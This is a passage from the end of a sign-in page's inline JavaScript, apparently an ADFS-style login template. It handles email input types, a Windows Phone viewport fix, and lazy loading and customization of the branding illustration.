var emails = document.querySelectorAll("input[type='email']");
if (emails) {
for (var i = 0; i < emails.length; i++) {
emails[i].type = 'text';
}
}
}

// In the CSS file we set the ms-viewport to be consistent with the device dimensions, 
// which is necessary for correct functionality of immersive IE. 
// However, for Windows 8 phone we need to reset the ms-viewport's dimension to its original
// values (auto), otherwise the viewport dimensions will be wrong for Windows 8 phone.
// Windows 8 phone has agent string 'IEMobile 10.0'
if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
var msViewportStyle = document.createElement("style");
msViewportStyle.appendChild(
document.createTextNode(
"@-ms-viewport{width:auto!important}"
)
);
msViewportStyle.appendChild(
document.createTextNode(
"@-ms-viewport{height:auto!important}"
)
);
document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
}

// If the innerWidth is defined, use it as the viewport width.
if (window.innerWidth && window.outerWidth && window.innerWidth !== window.outerWidth) {
var viewport = document.querySelector("meta[name=viewport]");
viewport.setAttribute('content', 'width=' + window.innerWidth + ', initial-scale=1.0, user-scalable=1');
}

// Gets the current style of a specific property for a specific element.
function getStyle(element, styleProp) {
var propStyle = null;

if (element && element.currentStyle) {
propStyle = element.currentStyle[styleProp];
}
else if (element && window.getComputedStyle) {
propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
}

return propStyle;
}

// The script below is used for downloading the illustration image 
// only when the branding is displaying. This script work together
// with the code in PageBase.cs that sets the html inline style
// containing the class 'illustrationClass' with the background image.
var computeLoadIllustration = function () {
var branding = document.getElementById("branding");
var brandingDisplay = getStyle(branding, "display");
var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");

if (brandingDisplay && brandingDisplay !== "none" &&
brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
var newClass = "illustrationClass";

if (branding.classList && branding.classList.add) {
branding.classList.add(newClass);
} else if (branding.className !== undefined) {
branding.className += " " + newClass;
}
if (window.removeEventListener) {
window.removeEventListener('load', computeLoadIllustration, false);
window.removeEventListener('resize', computeLoadIllustration, false);
}
else if (window.detachEvent) {
window.detachEvent('onload', computeLoadIllustration);
window.detachEvent('onresize', computeLoadIllustration);
}
}
};

if (window.addEventListener) {
window.addEventListener('resize', computeLoadIllustration, false);
window.addEventListener('load', computeLoadIllustration, false);
}
else if (window.attachEvent) {
window.attachEvent('onresize', computeLoadIllustration);
window.attachEvent('onload', computeLoadIllustration);
}

// Function to change illustration image. Usage example below.
function SetIllustrationImage(imageUri) {
var illustrationImageClass = '.illustrationClass {background-image:url(' + imageUri + ');}';

var css = document.createElement('style');
css.type = 'text/css';

if (css.styleSheet) css.styleSheet.cssText = illustrationImageClass;
else css.appendChild(document.createTextNode(illustrationImageClass));

document.getElementsByTagName("head")[0].appendChild(css);
}
</script>


</body>
</html> 